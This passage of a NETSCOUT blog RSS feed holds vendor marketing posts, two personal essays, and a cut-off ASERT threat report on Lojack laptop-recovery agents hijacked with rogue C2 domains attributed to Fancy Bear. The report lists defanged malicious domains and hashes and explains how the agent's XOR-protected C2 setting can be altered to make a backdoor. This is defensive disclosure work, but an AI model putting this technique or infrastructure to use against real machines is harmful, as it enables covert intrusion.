<p>Now imagine for a moment that the same proven <a href="https://www.netscout.com/solutions/network-performance-management" target="_blank">network monitoring</a> tools and techniques that your operations staff depends on to manage the core and data center networks already is available in your SD-WAN and other overlay networks such as NSX and OpenStack Neutron.  This would significantly reduce operational risk associated with adoption of these new technologies.  It would also reduce management CapEx and OpEx and most notably alleviate the shortage of skilled staff to monitor and manage these new technologies.  In my previous blog, Service Assurance in Hybrid Cloud at an Affordable TCO (<a href="https://www.onug.net/blog/service-assurance-hybrid-cloud-affordable-tco/" target="_blank">https://www.onug.net/blog/service-assurance-hybrid-cloud-affordable-tco/</a>), I make this case for the hybrid cloud and how wire data solutions can be extended to empower and simplify application management across hybrid multi-cloud. </p>

<p>In its Spring 2017 publication ONUG Monitoring &amp; Analytics Working Group (M&amp;A WG) recommends a three-pillar monitoring strategy:  application, infrastructure, and network.  We believe that wire data forms a core component of both network and application visibility.  (All legitimate user and criminal activity traverses the wire.)  And, what is needed is the extension of wire data instrumentation to new technologies such as a SD-WAN and cloud as opposed to upending your proven management strategy and foregoing this valuable source of data when dealing with emerging technologies.</p>

<p><img alt="sdwan gateway" class="align-center" data-entity-type="file" data-entity-uuid="3a1cff48-b5ed-49e2-a13c-39cdbbefd450" src="http://localhost:7996/sites/default/files/inline-images/gateway.jpg" /></p>

<p> </p>

<p>A visibility VNF deployed on the uCPE provides an elegant solution to all three monitoring challenges of SD-WAN.  It could acquire wire data by tapping the hypervisor’s vSwitch traffic.  This traffic will include hop-by-hop interaction of service provider VNFs that are service chained.  User activity on the wire is observed after SD-WAN’s encrypted tunnel termination providing deep visibility into the performance of both the network and applications (Unified Communications, Oracle/SAP, Sharepoint, Office365, Salesforce, and etc.).  For the users of SaaS applications in remote locations whose traffic does not go back to the core this provides total visibility, which is otherwise non-existent.</p>

<p>Furthermore, since the uCPE represents remote user locations, the wire data gleaned provides a valuable user perspective, including Individual session analysis and packet decodes, which can be compared with those from the datacenter and public cloud locations to address hard to isolate performance problems quickly.  (Similar approaches extend wire data monitoring to other overlay networks such as NSX and OpenStack Neutron.)  Finally, this approach provides a vendor independent solution for visibility and service assurance in a fractured SD-WAN and public cloud market place.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/sdwan.jpg" length="171934" type="image/jpeg"/>
    <guid isPermaLink="false">aa023876-1fac-4153-98d7-7ad6573de94f</guid>
    <pubDate>Mon, 21 May 2018 13:58:44 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Babak Roushanaee</dc:creator>
    </item>
<item>
  <title>Moving Beyond Log Data</title>
  <link>http://localhost:7996/blog/moving-beyond-log-data</link>
  <description>In a recent Forbes article, IDC predicts the world will be creating 163 zettabytes of data per year by 2025. This is a ten-fold increase in worldwide data creation from the current rate of 16.3ZB.</description>
  <content:encoded><![CDATA[<p>When the term “big data” is bandied about these days, few consider the actual volume of data being created. In a recent <a href="https://www.forbes.com/sites/andrewcave/2017/04/13/what-will-we-do-when-the-worlds-data-hits-163-zettabytes-in-2025/#3d871bd6349a" target="_blank">Forbes</a> article, IDC predicts the world will be creating 163 zettabytes of data per year by 2025. This is a ten-fold increase in worldwide data creation from the current rate of 16.3ZB.</p>

<p>With all this data being collected from multiple applications and infrastructures, storage and processing presents a real challenge for IT professionals – not to mention a burdensome cost. The options for dealing with this large volume of data are less than optimal. Exporting data from the cloud to a physical datacenter is exorbitant. Cloud storage of log data requires a significant amount of space, which has prompted many administrators to cull logs in order to reduce the volume and subsequent cost of storage. Of course, winnowing this log data can lead to the loss of valuable and irreplaceable information. And ultimately, the loss of data can diminish the potential benefits and advantages of big data.</p>

<p>As more and more log data is collected from sources such as load balancers, other network equipment, servers, databases, and service enablers, IT and commercial decision-makers find themselves unable to access this vital information in real time. And without real-time access, they cannot assure the performance of critical services and applications.</p>

<p>IT needs to move beyond log data and take a <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-05.14.18">smart data approach</a>. Such an approach zooms in on the wire data extracted at the source (such as IP packets, segments, sessions, and application data flows) where it is compressed into metadata in real time. Because compression levels are high, and only relevant information is retained, storage costs are significantly reduced. This also enables IT to keep this data longer, which allows for detailed historical analysis of incidents and events.</p>

<p>By continuously monitoring wire data across key service performance metrics, IT gains access to completely contextualized data in real time for the entire IT infrastructure. Using a smart data approach, companies can benefit from greater visibility into their networks, allowing IT to assure the quality of service and business operations. In addition to reducing the size of storage, smart data allows companies to have access to the valuable information they need to leverage meaningful, actionable insights that support better decisions and achieve business success.</p>

<p>This blog is based on the article, <a href="https://www.solutions-numeriques.com/de-la-log-data-a-la-smart-data/" target="_blank"><em>From log data to smart data </em></a>written by Daniel Crowe, Regional Director France and Southern Europe for NETSCOUT, which was published at Solutions Numeriques.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/smart%20data%20approach.jpg" length="122080" type="image/jpeg"/>
    <guid isPermaLink="false">01473968-7463-46db-8951-3646dba03881</guid>
    <pubDate>Tue, 15 May 2018 14:04:48 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Everything I Learned, I Learned from My Mom</title>
  <link>http://localhost:7996/blog/everything-i-learned-i-learned-my-mom</link>
  <description>Forget Kindergarten… everything I’ve learned, I learned from my Mom. At first meeting, my Mom would not strike one as a force to be reckoned with. She was small in stature and quiet in nature. Her dream was to have a big, loving family – which she accomplished. As I was growing up as the youngest of twelve, these are the pivotal things that I learned from my ninety-eight-pound...</description>
  <content:encoded><![CDATA[<p>Forget Kindergarten… everything I’ve learned, I learned from my Mom.</p>

<p>At first meeting, my Mom would not strike one as a force to be reckoned with. She was small in stature and quiet in nature. Her dream was to have a big, loving family – which she accomplished. As I was growing up as the youngest of twelve, these are the pivotal things that I learned from my ninety-eight-pound warrior of a mother.</p>

<ul><li>Life is not fair. Get over it and move on</li>
	<li>If you don’t like it, change it</li>
	<li>Just be you – If you want to run away from home, pack a peanut butter and jelly sandwich</li>
</ul><img alt="Everything I Learned, I Learned from My Mom" data-entity-type="file" data-entity-uuid="17b0992d-e891-4cee-86f9-4e9b12b02136" src="http://localhost:7996/sites/default/files/inline-images/mom1_0.jpg" class="align-center" /><p> </p>

<p><strong>Life is not fair.</strong> Get over it and move on. I was instructed on the fairness in life during childhood when my evil brother left me stuck up in a tree. After yelling hours, or so it seemed, for help I managed to get myself down from the tree. Imagine my indignation when my Mom let me know she heard me yelling, but decided to let me figure it out on my own. This was one of the more memorable life lessons on fairness and figuring out a way to overcome. I’ve had many incidents throughout my professional career to “refresh” this lesson. As I began a marketing job at a large communications company in the mid-90s, I was confronted with another co-worker’s less than stellar work ethic. My manager’s lesson? “Are you going to let someone else be an obstacle to your success?” A lesson I remember more than twenty years later.</p>

<p><strong>If you don’t like it, change it.</strong> Women live and work in a world filled with possibilities, but we also have a responsibility to keep “changing it.” In a time where women are more educated and more doors are opened to us, we are still underrepresented in many professions. In 1957, Ruth Bader Ginsberg was one of two women on the Harvard Law Review. In 2017, specifically in the cybersecurity profession, only 11% of women are represented which is much lower than the representation of women in the global workforce. Last year, women in cybersecurity earned less than our male counterparts. The lesson here is that we shouldn’t accept it and we need to be advocates of <strong>change</strong>.</p>

<p>Change starts with us as individuals and as women. What can YOU do to increase the visibility for women within your organization? How can YOU nurture talent within? How are YOU pushing yourself to take risk to step out of your comfort zone? The organization I work for, Arbor Networks, has started a grass-roots women’s leadership initiative called Women on their Way (WoW). The initiative is about raising the voice of women and empowering them to share their talent. We had our inaugural kickoff meeting with our Sales women and the energy was phenomenal. We are planning a virtual rollout that will be company-wide mid-May. We are excited to invoke change in not only our women, but in the community of young women who show interest in embracing STEM. A critical piece of our invoking change will be to help these young women see opportunity exists in STEM across many functional areas – you do not have to be a coder to be successful in cybersecurity. You do have to be unique and we intend to let the world know that the women of Arbor Networks are warriors just like our mothers taught us to be!</p>

<p><strong>Just be you.</strong> Like a lot of women, I sometimes fail. And it’s okay. You’d think my less than stellar attempts at athletics during high school would have taught me not to be so competitive, but it taught me a lot about failing and trying anyway. With all due respect to the master, I disagree with the directive, “Do or do not. There is no try.” It should be “Try and do, say I.” How many of us, male or female, have felt like some days we don’t quite make the grade? I try to juggle children, work, marriage, faith, community, and home, but things fall through the cracks. And most days it’s okay. I do have two advantages that others may not experience: I have a spouse who doesn’t care about traditional gender roles, and with all of the allergies in the world I’m no longer required to provide home-baked goods so I have decided to give up cooking to give time back to myself and my family. If it was good enough for the Notorious RBG, it’s good enough for me. I haven’t given it up completely, but I have decided no one dies if we have take-out or my kids eat cereal for supper. Give yourself and others permission not to be super-human. If you’re having trouble with this concept, take a day off, pack yourself a peanut butter and jelly sandwich and go see <a href="http://www.imdb.com/title/tt4651520/" target="_blank">Bad Moms</a>.</p>

<p>Whether life requires hard-work or the foresight to bring along a peanut butter sandwich, be prepared.</p>
<img alt="Everything I Learned, I Learned from My Mom" data-entity-type="file" data-entity-uuid="8b376781-f976-422e-8b05-aa529e01f582" src="http://localhost:7996/sites/default/files/inline-images/mom2.jpg" class="align-center" /><p> </p>

<p>We need to evolve and change professionally and personally. These are concepts my Mom and Ms. Ginsberg learned and put into practice throughout their lives, lives that started long before the rights we enjoy today. In a time when traditional women’s roles were the norm. RBGs efforts to empower women and men are well documented. My Mom’s efforts are only documented within family lore. Fortunately, she taught those lessons to her many children. She taught my brothers to respect women, to listen, and to treat “all the people” as equal. She taught my sisters to be fierce and fabulous. She raised our family while my Dad worked away from home as a construction superintendent. In addition to her full-time Mom job, she had a part-time job. Did I mention, she had twelve children and survived breast cancer? Yes, I said twelve and we weren’t mistakes (and no, we didn’t grow up on a farm).</p>

<p>I want to become my Mom. To her and the other amazing people in my life, I say “thanks for the lessons. I promise to keep changing.”</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/Mom%20main%20image.jpg" length="522696" type="image/jpeg"/>
    <guid isPermaLink="false">1eeb4374-cc1d-443d-b52d-662bcf22a89f</guid>
    <pubDate>Mon, 07 May 2018 12:55:54 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Janel Ryan</dc:creator>
    </item>
<item>
  <title>As NFV Becomes Reality, Network and Service Assurance Needed</title>
  <link>http://localhost:7996/blog/nfv-becomes-reality-network-and-service-assurance-needed</link>
  <description>Network Function Virtualization (NFV) is well on its way to widespread adoption. Recent research predicts carrier NFV investments top $37 billion in 2021 and have a compound annual growth rate (CAGR) of 30 percent between 2016 and 2021. North America is forecast to lead the way, accumulating $13 billion in NFV-related investments during 2022, while Europe is anticipated to see...</description>
  <content:encoded><![CDATA[<p>Network Function Virtualization (NFV) is well on its way to widespread adoption. Recent <a href="https://www.sdxcentral.com/articles/news/ihs-carrier-spending-nfv-will-top-37b-2021/2017/12/" target="_blank">research predicts</a> carrier NFV investments top $37 billion in 2021 and have a compound annual growth rate (CAGR) of 30 percent between 2016 and 2021. North America is <a href="http://www.isemag.com/2017/08/nfv-market-to-reach-38-billion-by-2022/" target="_blank">forecast</a> to lead the way, accumulating $13 billion in NFV-related investments during 2022, while Europe is anticipated to see growth rates around 53 percent CAGR between 2017 and 2022.</p>

<p>NFV holds tremendous promise for early adopters who look to reap important advantages such as reductions in network CapEx and OpEx, as well as gaining greater service agility and the ability to speed up deployment times of innovative new network elements.</p>

<p>With the advent of 5G, operators are increasingly focusing on facilitating greater efficiencies – which NFV is well suited to support. An important subset of the move to NFV will be Media Function Virtualization (MFV), which will be critical for more effective allocation of network resources during peak video usage.</p>

<p>As 5G advances, Communication Service Providers (CSPs) are expected to place a greater emphasis on capacity. Due to steady advances in millimeter-wave propagation,</p>

<p>CSPs are also placing a larger focus on fixed-wireless access. At the same time, in response to low-latency needs with 5G, operators are looking at mobile-edge computing to achieve desired objectives.</p>

<p>In addition, CSPs are increasingly focusing on B2C and B2B implementations of Narrowband Internet of Things (NB-IoT). NETSCOUT believes <a href="https://www.netscout.com/product/ngenius-flows/?lsPR-MKTG&amp;lsd=blog-05.03.2018-1">network slicing</a> will prove to be an important influence, allowing IoT to deliver on future expectations.</p>

<p>Of course, with all of these new business models, network and service assurance will be absolutely imperative to achieve success. When it comes to service, NETSCOUT is the industry leader, turning real-time network data into actionable insights that allow operators to improve network performance and ultimately, the quality of the user experience.</p>

<p>This blog is based on the article, <a href="http://telecoms.com/488223/were-getting-closer-to-the-nfv-promised-land/" target="_blank"><em>We’re getting closer to the NFV promised land </em></a>published on Telecoms.com.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/NFV_2.jpg" length="196299" type="image/jpeg"/>
    <guid isPermaLink="false">fceba000-346c-423d-873a-439da8495ad7</guid>
    <pubDate>Thu, 03 May 2018 13:54:06 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Fake It Until You Become It</title>
  <link>http://localhost:7996/blog/fake-it-until-you-become-it-amy-cuddy</link>
  <description>We all know the phrase, “fake it until you make it.” And if you’re honest with yourself, you think, “that’s great until people figure out I’m faking it.” As it happens, faking it may help you become it. This idea originates with social psychologist, Amy Cuddy. Through her research on non-verbal expressions, she provides insights on what we can do to influence our minds. My...</description>
  <content:encoded><![CDATA[<p>We all know the phrase, “fake it until you make it.” And if you’re honest with yourself, you think, “that’s great until people figure out I’m faking it.” </p>

<p><strong>As it happens, faking it may help you become it.</strong> </p>

<p>This idea originates with social psychologist, <a href="http://www.amycuddy.com/" target="_blank">Amy Cuddy</a>.  Through her research on non-verbal expressions, she provides insights on what we can do to influence our minds.</p>
<img alt="amy cuddy" data-entity-type="file" data-entity-uuid="13a6effc-dad7-4956-b929-d727d5fce223" src="http://localhost:7996/sites/default/files/inline-images/Fake%20it%20image1.jpg" class="align-center" /><p> </p>

<p>My favorite tool for influencing my mind are <a href="https://www.ted.com/talks" target="_blank">TedTalks</a>.  What I find refreshing about TedTalks is the wide variety of topics, presenters, and the brevity of the conversation.  Speakers can deliver complex ideas and discussions in under eighteen minutes.  In under seven minutes you can hear Niki Webber Allen take on <a href="https://www.ted.com/talks/nikki_webber_allen_don_t_suffer_from_your_depression_in_silence?utm_campaign=tedspread--b&amp;utm_medium=referral&amp;utm_source=tedcomshare" target="_blank">depression</a>.  In eighteen, food guru Jamie Oliver passionately discusses <a href="https://www.ted.com/talks/jamie_oliver?utm_campaign=tedspread--b&amp;utm_medium=referral&amp;utm_source=tedcomshare" target="_blank">sugar</a> and what it is doing to our country.</p>

<p><strong>Your body language shapes who you are.</strong></p>

<p>In Cuddy’s TedTalk, <a href="https://www.ted.com/talks/amy_cuddy_your_body_language_shapes_who_you_are?utm_campaign=tedspread--b&amp;utm_medium=referral&amp;utm_source=tedcomshare" target="_blank">Your Body Language Shapes Who You Are</a>, Ann takes some common warnings many have heard such as “don’t cross your arms” and “don’t close yourself off” and practically applies them. Telling people to stop crossing their arms, stop scowling, and sit up straight is obvious to anyone who has taken a psychology class, but Ms. Cuddy provides the importance behind doing so.  Her research reveals that by paying attention to those non-verbal cues (and doing things to change them), you can shape your mind and how you perceive yourself, not just how others perceive you.</p>

<p>I recently attended a presentation skills workshop in which Ms. Cuddy’s research was referenced.  The research shows testosterone (the hormone that governs confidence) and cortisol (the hormone that affects stress levels) both contribute to our confidence.  In her study, Cuddy found that high levels of testosterone and low levels of cortisol help us to feel more powerful.  Conversely, high levels of cortisol can increase anxiety and reduce our confidence.</p>

<p>The study observed power poses (arms open, chin up, hands on hips) produce higher levels of testosterone than more timid poses (small slumped posture, shoulders in, eyes downcast) and certain body movements or postures produce changes in hormones.</p>

<p>How does this relate to our roles in business?  According to <a href="http://bodylanguagedr.com/#book" target="_blank">Dr. Donna Van Natten</a>, the body language doctor, understanding the power of non-verbal communication is critical in business.  Dr. Van Natten notes the 7/38/55 rule of communication.  This states that only 7% of our communication is outwards, while 38% is our tone of voice, and 55% is our body language.  I wasn’t aware of the rule either, but it comes out of research by <a href="http://www.rightattitudes.com/2008/10/04/7-38-55-rule-personal-communication/" target="_blank">Dr. Albert Mehrabian</a>.</p>
<img alt="body language" data-entity-type="file" data-entity-uuid="c2abd178-472b-4375-becf-75724cd74063" src="http://localhost:7996/sites/default/files/inline-images/Fake%20it%20image2.jpg" class="align-center" /><p> </p>

<p>So, our body language in meetings or in speaking engagements is actually communicating a lot louder than our words – Too much eye contact, fidgeting, clasping your hands.  At some point, it was decided clasp hands depict confidence.  This has since been shown to actually increase anxiety. Do not nod excessively – it is not only distracting; it makes you look like a bobble head.  Making yourself small – makes you feel small.  Invading others personal space is a no no – we all know and dislike a close talker.  Don’t forget, culture matters.  Body language has different meaning in different cultures.</p>

<p>If you want to portray confidence, do it and give it the Amazon warrior pose (otherwise known as the wonder woman pose).</p>

<p>So now that we know the importance of body language, can you fake it until you make it?  The answer is yes.  The same research shows when you assume a pose of power for more than two minutes, your hormone levels change.  Your body changes your mind.</p>

<p>The next time you have a presentation, an internal meeting, or an interview, try it.</p>

<p>Find a private space and pose for two minutes (think Superman or Wonder Woman without the crazy outfits or with… whatever works).  Configure your brain for confidence and reduce your anxiety.</p>

<p>Is this faking it?  Since Cuddy’s TedTalk, there has been plenty of opposition to her research and some say yes, it is faking it.  However, if you choose to believe in the power pose, (or other things like putting a pen in your mouth will make you happy) your confidence will give you the platform to share your knowledge and ideas.  Regardless of any opposition to her work, what she says make sense when you think about it. Crossing your arms, scowling, crossing your legs – all of these feel extremely limiting. Believing in Cuddy’s research actually gives you the opportunity to become it, rather than faking it. Why wouldn’t we all want to become it? I believe it, I practice it and I become it.</p>

<p>What about you?</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/community">Community</category>
    <enclosure url="http://localhost:7996/sites/default/files/Fake%20it%20main%20image.jpg" length="555841" type="image/jpeg"/>
    <guid isPermaLink="false">8ab8d624-ca3d-436b-978f-5eccef987258</guid>
    <pubDate>Thu, 03 May 2018 01:09:30 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Janel Ryan</dc:creator>
    </item>
<item>
  <title>Digital Transformation is Coming to a Store Near You</title>
  <link>http://localhost:7996/blog/digital-transformation-coming-store-near-you</link>
  <description>The way people shop has been changing. Over the past several years, Digital transformation (DX) has dramatically impacted the retail sector in a big way. According to recent studies, 90 percent of pre-purchasing research happens online. And 90 percent of shoppers use their smartphones in stores while they shop. These trends have spurred retailers to rethink their digital...</description>
  <content:encoded><![CDATA[<p>The way people shop has been changing. Over the past several years, Digital transformation (DX) has dramatically impacted the retail sector in a big way. According to <a href="https://www.i-scoop.eu/digital-transformation/retail-industry-digital-mobile-shopping-transformation/" target="_blank">recent studies</a>, 90 percent of pre-purchasing research happens online. And 90 percent of shoppers use their smartphones in stores while they shop. These trends have spurred retailers to rethink their digital strategies in order to remain relevant and take advantage of new opportunities.</p>

<p>Retailers, both large and small, have begun to embrace next-generation technologies such as cloud and Internet of Things (IoT) to improve the delivery of digital services to consumers, and dramatically enhance the customer experience. When combined with online shopping, these new technologies are literally transforming business models. Failure to embrace DX puts retailers at risk of losing their competitive edge and even becoming obsolete in the eyes of the consumer.</p>

<p>Today’s data-driven technology offers the opportunity to leverage critical insights to troubleshoot the retail experience, accessing critical information faster than ever before. To ensure they are delivering the best retail experience possible, IT teams need to monitor application and service performance in order to pinpoint the root-cause of problems anywhere, day or night. The simple truth is, customers won’t wait around, abandoning online shopping carts at the first sign of delays.</p>

<p>For IT, a combination of visibility, knowledge and speed is absolutely imperative. Pervasive visibility into the entire network - and anywhere along the service delivery path – is key to fulfilling digitalization strategies. As retailers embrace applications such as video, instant messaging and voice services, and rely on a converged IT infrastructure that includes hybrid cloud and sensors, it becomes even more important to have a service assurance and security strategy.</p>

<p>At the heart of the best <a href="https://www.netscout.com/solutions/digital-transformation/?lsPR-MKTG&amp;lsd=blog-04.25.2018-1">DX strategies</a> is an understanding that smart data can provide retailers with vital knowledge and intelligence to control business outcomes. Traffic data collected from the IoT edge to the data center, through private and public clouds, can be turned into smart data. This smart data can deliver actionable insights that allow retailers to ensure that the customer journey is a positive one, and, most importantly, that they remain competitive in today’s rapidly evolving marketplace.</p>

<p>It goes without saying that service assurance and security are not only critical for retailers today, but as the digital economy continues to grow larger and more complex, attaining visibility throughout the entire IT environment will be imperative to success of the business.</p>

<p>This blog is based on the article, <a href="https://www.retailtouchpoints.com/features/executive-viewpoints/digitalize-to-survive-how-to-ride-the-change" target="_blank"><em>Digitalize To Survive: How To Ride The Change</em></a><em>, </em>written by Ron Lifton, Senior Enterprise Solutions Manager at NETSCOUT, which was published on Retail Touch Points.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/dx_retail_0.jpg" length="138056" type="image/jpeg"/>
    <guid isPermaLink="false">a26b7b35-b148-4034-9812-cf6b200b4a58</guid>
    <pubDate>Tue, 01 May 2018 13:17:11 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Ron Lifton</dc:creator>
    </item>
<item>
  <title>Lojack Becomes a Double-Agent</title>
  <link>http://localhost:7996/blog/asert/lojack-becomes-double-agent</link>
  <description>Executive Summary ASERT recently discovered Lojack agents containing malicious C2s. These hijacked agents pointed to suspected Fancy Bear (a.k.a. APT28, Pawn Storm) domains. The InfoSec community and the U.S. government have both attributed Fancy Bear activity to Russian espionage activity. Fancy Bear actors typically choose geopolitical targets, such as governments and...</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>ASERT recently discovered Lojack agents containing malicious C2s. These hijacked agents pointed to suspected Fancy Bear (a.k.a. APT28, Pawn Storm) domains.&nbsp; The InfoSec community and the U.S. government have both attributed Fancy Bear activity to Russian espionage activity. &nbsp;Fancy Bear actors typically choose geopolitical targets, such as governments and international organizations. They also target industries that do business with such organizations, such as defense contractors.&nbsp; Lojack, formally known as Computrace, is a legitimate laptop recovery solution used by a number of companies to protect their assets should they be stolen.&nbsp; Lojack makes an excellent double-agent due to appearing as legit software while natively allowing remote code execution. Although the initial intrusion vector for this activity remains unknown, Fancy Bear often utilizes phishing email to deliver payloads. &nbsp; <strong><em>NOTE:</em></strong><em> Arbor APS enterprise security products detect and block on all activity noted in this report.</em></p>

<h2>Key Findings</h2>

<ul>
	<li>ASERT researchers identified Lojack agents containing command and control (C2) domains likely associated with Fancy Bear operations.</li>
	<li>Proof of concept in using Lojack as a backdoor or intrusion vector date back to 2014. Its continued use suggest attackers could have used it in long-running operations.</li>
	<li>Initially, the Lojack agents containing rogue C2 had low Anti-Virus (AV) detection which increased the probability of infection and subsequent successful C2 communication.</li>
	<li>The distribution mechanism for the malicious Lojack samples remains unknown. However, Fancy Bear commonly uses phishing to deliver malware payloads as seen with <a href="https://www.jigsawsecurityenterprise.com/post/2017/11/01/malicious-documents-targeting-security-professionals">Sedupload in late 2017</a>.</li>
</ul>

<h2>UPDATE</h2>

<ul>
	<li style="list-style-type: none">
	<ul>
		<li><strong>May 3, 2018 – </strong>After the disclosure of the malicious Lojack binaries, many Anti-Virus vendors have been quick to respond in properly marking samples as "malware" and "DoubleAgent", rather than "Riskware" or "unsafe" (<strong>Figure 2</strong>).</li>
		<li><strong>May 4th 2018 – </strong>UPDATE FROM ABSOLUTE SOFTWARE:
		<ul>
			<li><em>"The analysis of the samples provided by Arbor shows all were based on an illicitly modified old version of the LoJack agent from 2008 and no customers or partners have been impacted. For customers who wish to confirm no legacy agents are present in their environment, we have published an advisory with steps to verify all installed agents are legitimate copies of the LoJack product.&nbsp;</em></li>
		</ul>
		</li>
		<li><strong>May 9th 2018 – </strong>Disclaimer:
		<ul>
			<li>Prior reports have misidentified LoJack instead of Absolute LoJack for Laptops, also known as Computrace. LoJack for Laptops and Computrace are products of Absolute, not LoJack or CalAmp.</li>
		</ul>
		</li>
	</ul>
	</li>
</ul>

<h2>Lojack Summary</h2>

<p>Absolute Software, the creator of Lojack, says on its website (<a href="https://www.absolutelojack.com/">https://www.absolutelojack.com/</a>) that the agent can locate and lock a device remotely.&nbsp; Additionally, it can delete files, making it an effective laptop theft recovery and data wiping platform.&nbsp; Lojack can survive hard drive replacements and operating system (OS) re-imaging.&nbsp; The agent achieves this persistence through a modular design as noted by Vitaliy Kamlyuk, Sergey Belov, and Anibal Sacco in a presentation at Blackhat, 2014 (<strong>Figure 1</strong>): <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/Lojack_Persistence.png" /> Figure 1: Lojack persistence mechanism (Paraphrased from <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Kamluk-Computrace-Backdoor-Revisited-WP.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Kamluk-Computrace-B…</a>).</p>

<p>The aforementioned researchers suggest the binary modification of the "small agent" is trivial.&nbsp; The Lojack agent protects the hardcoded C2 URL using a single byte XOR key; however, according to researchers it blindly trusts the configuration content.&nbsp; Once an attacker properly modifies this value then the double-agent is ready to go.&nbsp; This is not the only aspect that makes Lojack an appealing target.&nbsp; Attackers are also concerned about AV detection.&nbsp; Looking on VirusTotal, some anti-virus vendors flag Lojack executables as ”unsafe”, but as noted as of May 3, many AV now flag the binaries as malware and DoubleAgent (<strong>Figure 2</strong>).</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/05/image.png" /> Figure 2: Virustotal AV Report of cf45ec807321d12f8df35fa434591460</p>

<p>Originally, the low AV detection, allowed the attacker to hide in plain sight, an effective double-agent. The attacker simply needs to stand up a rogue C2 server that simulates the Lojack communication protocols. Finally, Lojack’s “small agent” allows for memory reads and writes which grant it remote backdoor functionality when coupled with a rogue C2 server.</p>

<h2>Lojack Double-Agent</h2>

<p>ASERT has identified five Lojack agents (rpcnetp.exe) pointing to 4 different suspected domains.&nbsp; Fancy Bear has been tied to three of the domains in the past. <small> </small></p>

<table style="height: 321px" width="656">
	<tbody>
		<tr>
			<td width="179"><small><strong>Hash</strong></small></td>
			<td width="167"><small><strong>Compilation Time</strong></small></td>
			<td width="83"><small><strong>Size in Bytes</strong></small></td>
			<td width="107"><small><strong>Rogue C2 Servers</strong></small></td>
			<td width="102"><small><strong>AV Detection on VT</strong></small></td>
		</tr>
		<tr>
			<td width="179"><small>f1df1a795eb784f7bfc3ba9a7e3b00ac</small></td>
			<td width="167"><small>2008-04-01 19:35:07</small></td>
			<td width="83"><small>17,408</small></td>
			<td width="107"><small>sysanalyticweb[.]com</small></td>
			<td width="102"><small>2/67</small></td>
		</tr>
		<tr>
			<td width="179"><small>6eaa1ff5f33df3169c209f98cc5012d0</small></td>
			<td width="167"><small>2008-04-01 19:35:07</small></td>
			<td width="83"><small>17,408</small></td>
			<td width="107"><small>sysanalyticweb[.]com</small></td>
			<td width="102"><small>4/66</small></td>
		</tr>
		<tr>
			<td width="179"><small>f3c6e16f0dd2b0e55a7dad365c3877d4</small></td>
			<td width="167"><small>2008-04-01 19:35:07</small></td>
			<td width="83"><small>17,408</small></td>
			<td width="107"><small>elaxo[.]org</small></td>
			<td width="102"><small>3/62</small></td>
		</tr>
		<tr>
			<td width="179"><small>cf45ec807321d12f8df35fa434591460</small></td>
			<td width="167"><small>2008-04-01 19:35:07</small></td>
			<td width="83"><small>17,408</small></td>
			<td width="107"><small>ikmtrust[.]com</small></td>
			<td width="102"><small>2/64</small></td>
		</tr>
		<tr>
			<td width="179"><small>f391556d9f89499fa8ee757cb3472710</small></td>
			<td width="167"><small>2008-04-01 19:35:07</small></td>
			<td width="83"><small>17,408</small></td>
			<td width="107"><small>lxwo[.]org</small></td>
			<td width="102"><small>9/65</small></td>
		</tr>
	</tbody>
</table>

<p><small><em>Table 1: Lojack Double-Agents on VirusTotal</em> </small> &nbsp;</p>

<h2>Binary Comparisons</h2>

<p>ASERT believes all these binaries are rpcnetp.exe (small agent) due to the following characteristics:</p>

<ul>
	<li>Size matching: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Kamluk-Computrace-Backdoor-Revisited-WP.pdf">17,408 bytes</a></li>
	<li><a href="#Yara">Yara match</a> on either:
	<ul>
		<li>“TagId” and “rpcnetp.exe”</li>
		<li>Set of op codes</li>
	</ul>
	</li>
	<li>Matching export function “rpcnetp” in the binaries.</li>
</ul>

<p>After confirming the stage of the Lojack agent, binary comparison analysis confirmed that they were legitimate Lojack samples.&nbsp; The comparison also highlighted that the attacker did not graft additional functionality into the binary. &nbsp;ASERT used the presence of search.namequery[.]com in the binary and the <a href="#Yara">yara rule</a> to identify legitimate Lojack samples.&nbsp; Lojack’s Absolute Software Corp. owns search.namequery[.]com; we have no evidence the legitimate site has been used for nefarious purposes. <strong>NOTE</strong><strong>: </strong>All samples, both rogue and the two “clean” samples (below), matched 100% based on Diaphora’s function matching algorithm. <u>“Clean” Samples:</u></p>

<ol>
	<li>e78e3b0171b189074d2539c7baaa0719</li>
	<li>ac1a85d3ca1b6265cad4ed41b696f9b7</li>
</ol>

<p>Only the presence of the rogue C2's make the samples in <strong>Table</strong> <strong>1</strong> malicious. The attackers are merely hijacking the communication used by Lojack, thereby granting themselves backdoor access to machines running the software.</p>

<h2>Fancy Bear Attribution</h2>

